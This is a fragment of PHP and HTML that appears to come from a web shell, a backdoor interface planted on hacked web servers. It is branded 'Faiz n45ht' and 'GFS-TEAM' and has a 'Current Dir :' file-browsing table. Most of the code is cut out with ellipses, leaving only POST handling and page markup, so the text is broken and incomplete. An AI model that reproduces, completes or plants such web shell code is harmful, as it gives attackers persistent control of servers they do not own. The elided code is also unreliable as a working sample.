...
if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        ...
        <body>
            <h1>
                <center>
                    <font color="cyan">Faiz n45ht</font>
                </center>
            </h1>
            <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
                <tr>
                    <td>
                        <font color="white">Current Dir :</font> ';
...
} echo "<br><center>Copyright © 2017 - </body></html>" . (int)date('Y'). " GFS-TEAM";
